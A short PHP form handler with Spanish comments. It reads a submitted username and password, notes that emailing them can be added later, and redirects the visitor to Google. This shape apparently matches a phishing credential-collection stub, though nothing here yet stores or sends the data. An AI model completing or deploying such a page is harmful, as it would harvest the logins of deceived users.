<?php
// Primero verificamos que llegue por el formulario
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Recibimos los datos con seguridad para evitar avisos
    $usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : "";
    $password = isset($_POST["password"]) ? trim($_POST["password"]) : "";

    // --- Aquí puedes agregar después el envío de correo si quieres ---
    // Por ahora solo redirige correctamente

    // Redirigir a Google
    header("Location: https://www.google.com");
    exit; // Detenemos todo para que no siga ejecutando

} else {
    // Si entran directo al archivo, regresan al formulario
    header("Location: index.html");
    exit;
}
?>
